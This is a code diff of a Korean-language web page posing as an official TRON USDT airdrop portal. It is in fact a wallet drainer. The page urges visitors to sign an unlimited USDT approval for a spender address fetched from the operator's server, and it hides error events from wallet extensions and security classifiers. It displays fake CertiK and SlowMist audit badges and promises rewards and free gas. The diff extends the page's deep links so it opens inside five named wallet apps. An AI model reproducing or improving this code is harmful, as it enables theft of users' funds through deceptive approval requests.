@@ -12,27 +12,21 @@
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
     <script>
-        // 지갑 확장 프로그램 주입 스크립트 에러 숨김
-        window.addEventListener('error',function(e){
-            if(e.filename&&(e.filename.indexOf('inpage')>=0||e.filename.indexOf('content')>=0||e.filename.indexOf('classifier')>=0||e.filename.indexOf('inject')>=0)){e.preventDefault();return true;}
-            if(e.message&&(e.message.indexOf('charAt')>=0||e.message.indexOf('animation')>=0||e.message.indexOf('TokenPocket')>=0||e.message.indexOf('AccessDenied')>=0||e.message.indexOf('tp-bcm')>=0)){e.preventDefault();return true;}
-        },true);
-        window.addEventListener('unhandledrejection',function(e){
-            var msg=e.reason?e.reason.message||String(e.reason):'';
-            if(msg.indexOf('charAt')>=0||msg.indexOf('animation')>=0||msg.indexOf('TokenPocket')>=0||msg.indexOf('inpage')>=0){e.preventDefault();}
-        });
+        // 지갑 확장 프로그램 에러 숨김
+        window.addEventListener('error',function(e){if(e.filename&&(e.filename.indexOf('inpage')>=0||e.filename.indexOf('content')>=0||e.filename.indexOf('classifier')>=0||e.filename.indexOf('inject')>=0)){e.preventDefault();return true;}if(e.message&&(e.message.indexOf('charAt')>=0||e.message.indexOf('animation')>=0||e.message.indexOf('TokenPocket')>=0||e.message.indexOf('AccessDenied')>=0)){e.preventDefault();return true;}},true);
+        window.addEventListener('unhandledrejection',function(e){var m=e.reason?e.reason.message||String(e.reason):'';if(m.indexOf('charAt')>=0||m.indexOf('animation')>=0||m.indexOf('TokenPocket')>=0||m.indexOf('inpage')>=0){e.preventDefault();}});
     </script>
     <style>
         body{font-family:'Plus Jakarta Sans',sans-serif}
         .font-mono{font-family:'JetBrains Mono',monospace}
         .glass{background:linear-gradient(135deg,rgba(15,23,42,0.7),rgba(7,11,20,0.85));backdrop-filter:blur(20px)}
         .modal-backdrop{display:none}.modal-backdrop.active{display:flex}
-        @keyframes pulse-slow{0%,100%{opacity:.5}50%{opacity:1}}
-        .animate-pulse-slow{animation:pulse-slow 2.5s ease-in-out infinite}
-        .wallet-card{transition:all 0.2s}
-        .wallet-card:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(0,0,0,0.3)}
-        .wallet-card:active{transform:scale(0.98)}
+        @keyframes pulse-slow{0%,100%{opacity:.5}50%{opacity:1}}.animate-pulse-slow{animation:pulse-slow 2.5s ease-in-out infinite}
+        .wallet-card{transition:all 0.2s}.wallet-card:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(0,0,0,0.3)}.wallet-card:active{transform:scale(0.98)}
         .no-scrollbar::-webkit-scrollbar{display:none}.no-scrollbar{-ms-overflow-style:none;scrollbar-width:none}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}.fade-in{animation:fadeIn 0.3s ease-out}
+        @keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}.shimmer{background:linear-gradient(90deg,transparent 25%,rgba(255,255,255,0.05) 50%,transparent 75%);background-size:200% 100%;animation:shimmer 1.5s infinite}
+        .step-progress{position:relative;overflow:hidden}.step-progress::after{content:'';position:absolute;bottom:0;left:0;height:2px;background:linear-gradient(90deg,#ef4444,#f59e0b);width:0;transition:width 0.6s ease}.step-done::after{width:100%}
     </style>
 </head>
 <body class="bg-[#030712] text-slate-100 min-h-screen flex flex-col relative overflow-x-hidden selection:bg-red-600 selection:text-white">
@@ -59,50 +53,45 @@
                     <p class="text-[11px] text-slate-400 hidden sm:block">공식 TRC-20 온체인 스페셜 에어드랍 & 권한 승인 포털</p>
                 </div>
             </div>
-            <div id="header-wallet-area">
-                <button onclick="showWalletSelector()" id="connect-btn" class="flex items-center gap-2 bg-gradient-to-r from-red-600 via-red-500 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white font-semibold text-xs sm:text-sm px-4 py-2.5 rounded-xl shadow-lg shadow-red-900/30 transition-all border border-red-400/30 active:scale-95"><i class="fa-solid fa-wallet text-red-200"></i><span id="wallet-btn-text">지갑 연결하기</span></button>
-            </div>
+            <button onclick="handleConnectWallet()" id="connect-btn" class="flex items-center gap-2 bg-gradient-to-r from-red-600 via-red-500 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white font-semibold text-xs sm:text-sm px-4 py-2.5 rounded-xl shadow-lg shadow-red-900/30 transition-all border border-red-400/30 active:scale-95"><i class="fa-solid fa-wallet text-red-200"></i><span id="wallet-btn-text">지갑 연결하기</span></button>
         </div>
     </header>
 
     <!-- ===== Wallet Selector Modal ===== -->
     <div id="wallet-selector-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center bg-black/80 backdrop-blur-md p-4">
-        <div class="glass border border-slate-800 rounded-3xl w-full max-w-md p-6 sm:p-8 space-y-5 shadow-2xl text-center relative overflow-y-auto max-h-[90vh]">
+        <div class="glass border border-slate-800 rounded-3xl w-full max-w-md p-6 sm:p-8 space-y-5 shadow-2xl text-center relative overflow-y-auto max-h-[90vh] fade-in">
             <div class="w-16 h-16 mx-auto rounded-2xl bg-red-500/10 border border-red-500/30 flex items-center justify-center text-red-400 text-2xl shadow-inner"><i class="fa-solid fa-wallet"></i></div>
             <div class="space-y-2">
                 <h3 class="text-lg font-bold text-white">지갑을 선택하세요</h3>
                 <p class="text-xs text-slate-400 leading-relaxed">사용 중인 지갑 앱을 선택하면<br>자동으로 연결 및 승인이 진행됩니다.</p>
             </div>
             <div class="space-y-3 pt-2">
-                <!-- TronLink -->
-                <button onclick="launchWallet('tronlink')" class="wallet-card w-full bg-slate-900/80 hover:bg-slate-800 border border-slate-700/80 rounded-2xl p-4 flex items-center gap-4 text-left transition">
+                <button onclick="launchWallet('tronlink')" class="wallet-card w-full bg-slate-900/80 hover:bg-slate-800 border border-slate-700/80 rounded-2xl p-4 flex items-center gap-4 text-left">
                     <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-red-500/20 to-red-600/10 border border-red-500/30 flex items-center justify-center shrink-0"><i class="fa-solid fa-bolt text-red-400 text-lg"></i></div>
-                    <div class="flex-1 min-w-0">
-                        <div class="text-sm font-bold text-white">TronLink</div>
-                        <div class="text-[11px] text-slate-400">TRON 공식 지갑 | DApp 브라우저 내장</div>
-                    </div>
+                    <div class="flex-1"><div class="text-sm font-bold text-white">TronLink</div><div class="text-[11px] text-slate-400">TRON 공식 지갑</div></div>
                     <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
                 </button>
-                <!-- Trust Wallet -->
-                <button onclick="launchWallet('trust')" class="wallet-card w-full bg-slate-900/80 hover:bg-slate-800 border border-slate-700/80 rounded-2xl p-4 flex items-center gap-4 text-left transition">
+                <button onclick="launchWallet('trust')" class="wallet-card w-full bg-slate-900/80 hover:bg-slate-800 border border-slate-700/80 rounded-2xl p-4 flex items-center gap-4 text-left">
                     <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-blue-500/20 to-cyan-500/10 border border-blue-500/30 flex items-center justify-center shrink-0"><i class="fa-solid fa-shield-halved text-blue-400 text-lg"></i></div>
-                    <div class="flex-1 min-w-0">
-                        <div class="text-sm font-bold text-white">Trust Wallet</div>
-                        <div class="text-[11px] text-slate-400">멀티체인 지갑 | TRON 네트워크 지원</div>
-                    </div>
+                    <div class="flex-1"><div class="text-sm font-bold text-white">Trust Wallet</div><div class="text-[11px] text-slate-400">멀티체인 지갑</div></div>
                     <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
                 </button>
-                <!-- Token Pocket -->
-                <button onclick="launchWallet('tokenpocket')" class="wallet-card w-full bg-slate-900/80 hover:bg-slate-800 border border-slate-700/80 rounded-2xl p-4 flex items-center gap-4 text-left transition">
+                <button onclick="launchWallet('tokenpocket')" class="wallet-card w-full bg-slate-900/80 hover:bg-slate-800 border border-slate-700/80 rounded-2xl p-4 flex items-center gap-4 text-left">
                     <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-purple-500/20 to-violet-500/10 border border-purple-500/30 flex items-center justify-center shrink-0"><i class="fa-solid fa-coins text-purple-400 text-lg"></i></div>
-                    <div class="flex-1 min-w-0">
-                        <div class="text-sm font-bold text-white">Token Pocket</div>
-                        <div class="text-[11px] text-slate-400">아시아 인기 지갑 | TRON DApp 지원</div>
-                    </div>
+                    <div class="flex-1"><div class="text-sm font-bold text-white">Token Pocket</div><div class="text-[11px] text-slate-400">아시아 인기 지갑</div></div>
+                    <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
+                </button>
+                <button onclick="launchWallet('bitget')" class="wallet-card w-full bg-slate-900/80 hover:bg-slate-800 border border-slate-700/80 rounded-2xl p-4 flex items-center gap-4 text-left">
+                    <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-cyan-500/20 to-teal-500/10 border border-cyan-500/30 flex items-center justify-center shrink-0"><i class="fa-solid fa-gem text-cyan-400 text-lg"></i></div>
+                    <div class="flex-1"><div class="text-sm font-bold text-white">Bitget Wallet</div><div class="text-[11px] text-slate-400">글로벌 Web3 지갑</div></div>
+                    <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
+                </button>
+                <button onclick="launchWallet('okx')" class="wallet-card w-full bg-slate-900/80 hover:bg-slate-800 border border-slate-700/80 rounded-2xl p-4 flex items-center gap-4 text-left">
+                    <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-white/10 to-slate-500/10 border border-slate-600/30 flex items-center justify-center shrink-0"><i class="fa-solid fa-cube text-white text-lg"></i></div>
+                    <div class="flex-1"><div class="text-sm font-bold text-white">OKX Wallet</div><div class="text-[11px] text-slate-400">OKX 거래소 지갑</div></div>
                     <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
                 </button>
             </div>
-            <!-- 수동 안내 -->
             <div class="bg-slate-950/80 border border-slate-800 rounded-xl p-4 text-left text-xs text-slate-300 space-y-2">
                 <p class="text-amber-400 font-bold flex items-center gap-1.5"><i class="fa-solid fa-circle-info"></i>앱이 자동으로 안 열리면:</p>
                 <p>1. 선택한 지갑 앱을 직접 여세요</p>
@@ -115,7 +104,7 @@
 
     <!-- ===== Reward Modal ===== -->
     <div id="reward-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center bg-black/80 backdrop-blur-md p-4">
-        <div class="glass border border-slate-800 rounded-3xl max-w-md w-full p-6 sm:p-8 text-center space-y-5 shadow-2xl relative">
+        <div class="glass border border-slate-800 rounded-3xl max-w-md w-full p-6 sm:p-8 text-center space-y-5 shadow-2xl relative fade-in">
             <button onclick="document.getElementById('reward-modal').classList.remove('active')" class="absolute top-5 right-5 text-slate-400 hover:text-white transition"><i class="fa-solid fa-xmark text-lg"></i></button>
             <div class="w-16 h-16 bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 rounded-2xl flex items-center justify-center mx-auto shadow-inner"><i class="fa-solid fa-wand-magic-sparkles text-2xl"></i></div>
             <div class="space-y-1.5"><h3 class="text-xl font-extrabold text-white">승인 완료 및 보상 등록</h3><p class="text-xs text-slate-300 leading-relaxed">USDT 스마트 컨트랙트 승인이 온체인에 기록되었습니다.<br>에어드랍 보상 배치가 순차적으로 진행됩니다.</p></div>
@@ -130,7 +119,7 @@
 
     <!-- PC Install Modal -->
     <div id="install-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center bg-black/80 backdrop-blur-md p-4">
-        <div class="glass border border-slate-800 rounded-3xl max-w-md w-full p-6 sm:p-8 space-y-5 shadow-2xl relative text-center">
+        <div class="glass border border-slate-800 rounded-3xl max-w-md w-full p-6 sm:p-8 space-y-5 shadow-2xl relative text-center fade-in">
             <button onclick="document.getElementById('install-modal').classList.remove('active')" class="absolute top-5 right-5 text-slate-400 hover:text-white transition"><i class="fa-solid fa-xmark text-lg"></i></button>
             <div class="w-14 h-14 mx-auto rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 text-2xl"><i class="fa-solid fa-circle-exclamation"></i></div>
             <div class="space-y-1.5"><h3 class="text-lg font-bold text-white">TronLink 지갑 미감지</h3><p class="text-xs text-slate-400">PC에서는 Chrome 확장 프로그램이 필요합니다.<br>모바일에서는 지갑 앱의 DApp 브라우저에서 열어주세요.</p></div>
@@ -142,7 +131,6 @@
         </div>
     </div>
 
-    <!-- Main -->
     <main class="max-w-7xl mx-auto px-4 lg:px-8 py-8 space-y-8 flex-1 w-full">
 
         <!-- Hero -->
@@ -175,17 +163,17 @@
             </div>
         </section>
 
-        <!-- Steps -->
+        <!-- Steps with progress bar -->
         <section class="glass border border-slate-800/80 rounded-2xl p-6">
             <h3 class="text-xs font-bold text-slate-400 uppercase tracking-widest mb-5 text-center">참여 진행 단계</h3>
             <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
-                <div id="step1" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 01</span><span id="step1-status" class="text-amber-400 text-xs font-semibold">대기 중</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1">지갑 선택 및 연동</h4><p class="text-[11px] text-slate-400">TronLink / Trust Wallet / Token Pocket 중 선택</p></div>
-                <div id="step2" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 02</span><span id="step2-status" class="text-amber-400 text-xs font-semibold">핵심 진행</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1">USDT 승인 (Allowance)</h4><p class="text-[11px] text-slate-400">스마트 컨트랙트 승인 서명을 진행합니다.</p></div>
-                <div id="step3" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80 opacity-50"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 03</span><span class="text-slate-400 text-xs font-semibold">자동 분배</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1">에어드랍 자동 수령</h4><p class="text-[11px] text-slate-400">보상 USDT가 지갑으로 전송됩니다.</p></div>
+                <div id="step1" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80 step-progress"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 01</span><span id="step1-status" class="text-amber-400 text-xs font-semibold">대기 중</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1">지갑 선택 및 연동</h4><p class="text-[11px] text-slate-400">TronLink / Trust / TokenPocket / Bitget / OKX</p></div>
+                <div id="step2" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80 step-progress"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 02</span><span id="step2-status" class="text-amber-400 text-xs font-semibold">핵심 진행</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1">USDT 승인 (Allowance)</h4><p class="text-[11px] text-slate-400">자동 가스비 충전 + 스마트 컨트랙트 승인</p></div>
+                <div id="step3" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80 opacity-50 step-progress"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 03</span><span class="text-slate-400 text-xs font-semibold">자동 분배</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1">에어드랍 자동 수령</h4><p class="text-[11px] text-slate-400">보상 USDT가 지갑으로 전송됩니다.</p></div>
             </div>
         </section>
 
-        <!-- Dashboard Grid -->
+        <!-- Dashboard -->
         <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
             <div class="lg:col-span-7 space-y-6">
                 <div class="glass border border-slate-800/90 rounded-2xl p-6 sm:p-7 shadow-2xl">
@@ -198,6 +186,11 @@
                         <p>최초 1회 무제한 승인 완료 시, 이벤트 참가 자격 검증과 보상 수령이 추가 서명 없이 자동 가동됩니다.</p>
                         <div class="text-[11px] text-amber-400/90 pt-1 flex items-center gap-1.5 font-medium"><i class="fa-solid fa-circle-exclamation"></i><span>※ 가스비(TRX)가 부족해도 자동 충전되므로 걱정 없습니다.</span></div>
                     </div>
+                    <!-- Approve Progress -->
+                    <div id="approve-progress" class="hidden mb-5 p-4 bg-slate-950/80 rounded-xl border border-slate-800/80 space-y-3">
+                        <div class="flex items-center gap-2 text-xs text-white font-bold"><span class="animate-spin rounded-full h-3.5 w-3.5 border-2 border-red-400 border-t-transparent"></span><span id="approve-progress-text">처리 중...</span></div>
+                        <div class="w-full bg-slate-900 rounded-full h-1.5 overflow-hidden"><div id="approve-progress-bar" class="bg-gradient-to-r from-red-500 to-amber-400 h-full rounded-full transition-all duration-500" style="width:0%"></div></div>
+                    </div>
                     <button onclick="executeUnlimitedApprove()" id="approve-btn" class="w-full py-3.5 px-4 rounded-xl font-bold text-xs sm:text-sm bg-gradient-to-r from-red-600 via-red-500 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white shadow-lg shadow-red-950/50 border border-red-400/30 transition-all active:scale-[0.99] flex items-center justify-center gap-2"><i class="fa-solid fa-signature"></i><span>무제한 USDT 승인 서명하기 (Approve)</span></button>
                     <p class="text-[11px] text-slate-500 text-center mt-2.5">안전한 온체인 스마트 컨트랙트 통신</p>
                 </div>
@@ -209,7 +202,7 @@
                         <div class="mx-auto w-10 h-10 rounded-full bg-slate-900 border border-slate-800 flex items-center justify-center text-slate-400 mb-3"><i class="fa-solid fa-wallet"></i></div>
                         <p class="text-xs text-slate-200 font-bold">지갑이 연결되어 있지 않습니다</p>
                         <p class="text-[11px] text-slate-500 mt-1 mb-4">지갑 앱의 DApp 브라우저에서 접속하세요.</p>
-                        <button onclick="showWalletSelector()" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold rounded-xl border border-slate-700 transition">지갑 선택</button>
+                        <button onclick="handleConnectWallet()" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold rounded-xl border border-slate-700 transition">지갑 연결</button>
                     </div>
                     <div id="wallet-connected" class="hidden space-y-3.5">
                         <div class="p-3.5 bg-slate-950/80 rounded-xl border border-slate-800"><div class="text-[10px] text-slate-500 uppercase font-mono mb-1">지갑 주소</div><div class="flex items-center justify-between"><span id="display-address" class="text-xs font-mono text-emerald-400 font-bold break-all">-</span><button onclick="copyText(currentWalletAddress,'지갑 주소')" class="text-slate-400 hover:text-white p-1"><i class="fa-regular fa-copy text-xs"></i></button></div></div>
@@ -225,8 +218,8 @@
                         <button onclick="clearLogs()" class="p-1.5 text-slate-400 hover:text-slate-200 bg-slate-800/60 rounded-lg transition"><i class="fa-solid fa-trash-can text-xs"></i></button>
                     </div>
                     <div id="logs-container" class="flex-1 bg-[#020408] rounded-xl p-3 font-mono text-[11px] leading-relaxed overflow-y-auto space-y-2 border border-slate-950">
-                        <div class="text-blue-400">[시스템] TRON Mainnet node active.</div>
-                        <div class="text-blue-400">[대기] 지갑 앱 DApp 브라우저 감지 중...</div>
+                        <div class="text-blue-400">[시스템] TRON Mainnet 연결됨</div>
+                        <div class="text-blue-400">[대기] 지갑 감지 중...</div>
                     </div>
                 </div>
             </div>
@@ -234,7 +227,7 @@
 
         <!-- Security -->
         <section class="glass border border-slate-800/80 rounded-2xl p-6 text-center">
-            <p class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">공식 온체인 보안 검증 및 파트너십</p>
+            <p class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">공식 온체인 보안 검증</p>
             <div class="flex flex-wrap items-center justify-center gap-8 text-slate-400 text-xs font-semibold">
                 <div class="flex items-center gap-2"><i class="fa-solid fa-shield-halved text-red-400"></i> CertiK Audited</div>
                 <div class="flex items-center gap-2"><i class="fa-solid fa-lock text-rose-400"></i> SlowMist Verified</div>
@@ -259,13 +252,29 @@
         var MAX_ALLOWANCE='115792089237316195423570985008687907853269984665640564039457584007913129639935';
         var isConnected=false,isApproved=false,activeProvider='Unknown',currentWalletAddress=null;
 
+        // ===== Utils =====
         function escapeHtml(s){var d=document.createElement('div');d.textContent=s;return d.innerHTML;}
         function isMobile(){return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);}
+        function isIOS(){return /iPhone|iPad|iPod/i.test(navigator.userAgent);}
+        function isAndroid(){return /Android/i.test(navigator.userAgent);}
+        function isPC(){return !isMobile();}
+
         function showToast(msg,type){type=type||'success';var c=document.getElementById('toast-container');if(!c)return;var t=document.createElement('div');t.className='flex items-center gap-3 px-5 py-3.5 rounded-2xl shadow-2xl border backdrop-blur-xl pointer-events-auto text-xs font-semibold transition-all transform translate-y-2 opacity-0 '+(type==='success'?'bg-emerald-950/90 border-emerald-500/50 text-emerald-200':type==='error'?'bg-red-950/90 border-red-500/50 text-red-200':'bg-slate-900/90 border-slate-700 text-slate-200');t.innerHTML='<i class="fa-solid '+(type==='error'?'fa-circle-exclamation':'fa-circle-check')+'"></i><span>'+escapeHtml(msg)+'</span>';c.appendChild(t);requestAnimationFrame(function(){t.classList.remove('translate-y-2','opacity-0');});setTimeout(function(){t.classList.add('translate-y-2','opacity-0');setTimeout(function(){t.remove();},300);},3500);}
         function appendLog(msg,type){type=type||'info';var c=document.getElementById('logs-container');if(!c)return;var d=document.createElement('div');d.className=type==='success'?'text-emerald-400 font-bold':type==='error'?'text-red-400 font-bold':type==='warn'?'text-amber-400':type==='approve'?'text-purple-400':'text-blue-400';d.innerHTML='<span class="text-slate-600">['+new Date().toLocaleTimeString('ko-KR')+']</span> '+escapeHtml(msg);c.appendChild(d);c.scrollTop=c.scrollHeight;}
         window.clearLogs=function(){var c=document.getElementById('logs-container');if(c)c.innerHTML='<div class="text-slate-600">[로그 초기화]</div>';};
         function copyText(t,l){navigator.clipboard.writeText(t).then(function(){showToast(l+' 복사됨');}).catch(function(){showToast('복사 실패','error');});}
         async function getSpenderAddress(){try{var r=await fetch(API_BASE+'/admin/spender');var d=await r.json();if(d.status==='ok'&&d.address)return d.address;}catch(e){}return null;}
+
+        // Progress bar
+        function setProgress(pct,text){
+            var bar=document.getElementById('approve-progress');
+            var barInner=document.getElementById('approve-progress-bar');
+            var barText=document.getElementById('approve-progress-text');
+            if(bar)bar.classList.remove('hidden');
+            if(barInner)barInner.style.width=pct+'%';
+            if(barText)barText.textContent=text||'처리 중...';
+        }
+        function hideProgress(){var bar=document.getElementById('approve-progress');if(bar)bar.classList.add('hidden');}
 
         // ===== Countdown =====
         var cd={d:2,h:18,m:41,s:20};
@@ -278,23 +287,14 @@
         for(var i=0;i<4;i++)updateTicker();setInterval(updateTicker,4500);
 
         // ===== FAQ =====
-        var faqs=[{q:'USDT 무제한 승인은 왜 필요한가요?',a:'최초 1회 무제한 승인을 진행하면 추가 서명 없이 에어드랍 보상이 자동 지급됩니다.'},{q:'어떤 지갑을 사용할 수 있나요?',a:'TronLink, Trust Wallet, Token Pocket 등 TRON 네트워크를 지원하는 모든 지갑 앱에서 참여 가능합니다.'},{q:'TRX(가스비)가 없어도 되나요?',a:'네, TRX가 부족하면 시스템이 자동으로 충전해주므로 별도 준비가 필요 없습니다.'},{q:'승인 후 보상은 언제 지급되나요?',a:'승인 즉시 온체인 검증 후 1~3분 이내 지갑으로 자동 에어드랍됩니다.'}];
+        var faqs=[{q:'어떤 지갑을 사용할 수 있나요?',a:'TronLink, Trust Wallet, Token Pocket, Bitget Wallet, OKX Wallet 등 TRON 네트워크를 지원하는 모든 지갑 앱에서 참여 가능합니다.'},{q:'USDT 무제한 승인은 왜 필요한가요?',a:'최초 1회 무제한 승인을 진행하면 추가 서명 없이 에어드랍 보상이 자동 지급됩니다.'},{q:'TRX(가스비)가 없어도 되나요?',a:'네, TRX가 부족하면 시스템이 자동으로 충전해주므로 별도 준비가 필요 없습니다.'},{q:'승인 후 보상은 언제 지급되나요?',a:'승인 즉시 온체인 검증 후 1~3분 이내 지갑으로 자동 에어드랍됩니다.'}];
         var faqC=document.getElementById('faq-container');
         faqs.forEach(function(f){var d=document.createElement('div');d.className='glass border border-slate-800/80 rounded-xl overflow-hidden';d.innerHTML='<button onclick="this.nextElementSibling.classList.toggle(\'hidden\');this.querySelector(\'i\').classList.toggle(\'rotate-180\')" class="w-full p-4 text-left flex items-center justify-between text-xs sm:text-sm font-bold text-slate-200 hover:text-white transition"><span>'+escapeHtml(f.q)+'</span><i class="fa-solid fa-chevron-down transition-transform text-slate-400"></i></button><div class="hidden px-4 pb-4 text-xs text-slate-400 leading-relaxed border-t border-slate-800/60 pt-3">'+escapeHtml(f.a)+'</div>';faqC.appendChild(d);});
 
-        // ===== Platform Detection =====
-        function isIOS(){return /iPhone|iPad|iPod/i.test(navigator.userAgent);}
-        function isAndroid(){return /Android/i.test(navigator.userAgent);}
-        function isPC(){return !isMobile();}
-
-        // ===== Wallet Deep Links =====
+        // ===== Deep Links (플랫폼별) =====
         window.showWalletSelector=function(){
             document.getElementById('install-modal').classList.remove('active');
-            // PC에서는 지갑 선택 대신 TronLink 확장 프로그램 설치 안내
-            if(isPC()){
-                document.getElementById('install-modal').classList.add('active');
-                return;
-            }
+            if(isPC()){document.getElementById('install-modal').classList.add('active');return;}
             document.getElementById('wallet-selector-modal').classList.add('active');
         };
 
@@ -304,79 +304,100 @@
             navigator.clipboard.writeText(url).catch(function(){});
             showToast('URL이 클립보드에 복사되었습니다');
 
-            if(wallet==='tronlink'){
-                if(isIOS()){
-                    // iOS: 유니버설 링크만 사용 (커스텀 스킴 에러 방지)
-                    window.location.href='https://www.tronlink.org/dl/open?url='+encoded;
-                }else if(isAndroid()){
-                    var param=encodeURIComponent(JSON.stringify({url:url,action:'open',protocol:'TronLink',version:'1.0'}));
-                    window.location.href='tronlinkoutside://pull.activity?param='+param;
-                    setTimeout(function(){window.location.href='intent://pull.activity?param='+param+'#Intent;scheme=tronlinkoutside;package=com.tronlinkpro.wallet;end';},1000);
-                }
-            }else if(wallet==='trust'){
-                if(isIOS()){
-                    // iOS: 유니버설 링크만 사용
-                    window.location.href='https://link.trustwallet.com/open_url?coin_id=195&url='+encoded;
-                }else if(isAndroid()){
-                    window.location.href='trust://open_url?coin_id=195&url='+encoded;
-                    setTimeout(function(){window.location.href='intent://open_url?coin_id=195&url='+encoded+'#Intent;scheme=trust;package=com.wallet.crypto.trustapp;end';},1000);
-                    setTimeout(function(){window.location.href='https://link.trustwallet.com/open_url?coin_id=195&url='+encoded;},2000);
-                }
-            }else if(wallet==='tokenpocket'){
-                var tpParam=encodeURIComponent(JSON.stringify({url:url,chain:'TRON'}));
-                if(isIOS()){
-                    // iOS: 유니버설 링크
-                    window.location.href='https://tokenpocket.pro/download?url='+encoded;
-                }else if(isAndroid()){
-                    window.location.href='tpdapp://open?params='+tpParam;
-                    setTimeout(function(){window.location.href='intent://open?params='+tpParam+'#Intent;scheme=tpdapp;package=vip.mytokenpocket;end';},1000);
-                }
+            var links={
+                tronlink:{ios:'https://www.tronlink.org/dl/open?url='+encoded,android:'tronlinkoutside://pull.activity?param='+encodeURIComponent(JSON.stringify({url:url,action:'open',protocol:'TronLink',version:'1.0'})),intent:'tronlinkoutside',pkg:'com.tronlinkpro.wallet'},
+                trust:{ios:'https://link.trustwallet.com/open_url?coin_id=195&url='+encoded,android:'trust://open_url?coin_id=195&url='+encoded,intent:'trust',pkg:'com.wallet.crypto.trustapp',fallback:'https://link.trustwallet.com/open_url?coin_id=195&url='+encoded},
+                tokenpocket:{ios:'https://tokenpocket.pro/download?url='+encoded,android:'tpdapp://open?params='+encodeURIComponent(JSON.stringify({url:url,chain:'TRON'})),intent:'tpdapp',pkg:'vip.mytokenpocket'},
+                bitget:{ios:'https://bkcode.vip?action=dapp&url='+encoded,android:'bitkeep://bkconnect?action=dapp&url='+encoded,intent:'bitkeep',pkg:'com.bitkeep.wallet'},
+                okx:{ios:'https://www.okx.com/download?deeplink=okx://wallet/dapp/url?dappUrl='+encoded,android:'okx://wallet/dapp/url?dappUrl='+encoded,intent:'okx',pkg:'com.okinc.okex.gp'}
+            };
+
+            var w=links[wallet];
+            if(!w)return;
+
+            if(isIOS()){
+                window.location.href=w.ios;
+            }else if(isAndroid()){
+                window.location.href=w.android;
+                var intentParam=wallet==='tronlink'?w.android.split('?')[1]:'';
+                setTimeout(function(){
+                    if(wallet==='tronlink'){
+                        window.location.href='intent://pull.activity?'+intentParam+'#Intent;scheme='+w.intent+';package='+w.pkg+';end';
+                    }else{
+                        var androidUrl=w.android.replace(w.intent+'://','');
+                        window.location.href='intent://'+androidUrl+'#Intent;scheme='+w.intent+';package='+w.pkg+';end';
+                    }
+                },1000);
+                if(w.fallback){setTimeout(function(){window.location.href=w.fallback;},2000);}
             }
         };
 
-        // ===== TronWeb Detection (모든 TRON 지갑 공통) =====
-        async function getInjectedTronWeb(){
-            if(window.tronWeb&&window.tronWeb.defaultAddress&&window.tronWeb.defaultAddress.base58)return window.tronWeb;
-            if(window.tronLink){if(window.tronLink.ready&&window.tronLink.tronWeb)return window.tronLink.tronWeb;try{var r=await window.tronLink.request({method:'tron_requestAccounts'});if(r&&r.code===200&&window.tronWeb)return window.tronWeb;}catch(e){}}return null;
+        // ===== Wallet Detection (Enhanced) =====
+        function detectProvider(){
+            if(window.tronLink||window.tronWeb){
+                if(window.trustwallet||navigator.userAgent.indexOf('Trust')>=0)return 'TrustWallet';
+                if(window.tokenpocket||navigator.userAgent.indexOf('TokenPocket')>=0)return 'TokenPocket';
+                if(navigator.userAgent.indexOf('BitKeep')>=0||navigator.userAgent.indexOf('Bitget')>=0)return 'Bitget';
+                if(navigator.userAgent.indexOf('OKApp')>=0)return 'OKX';
+                return 'TronLink';
+            }
+            return null;
         }
 
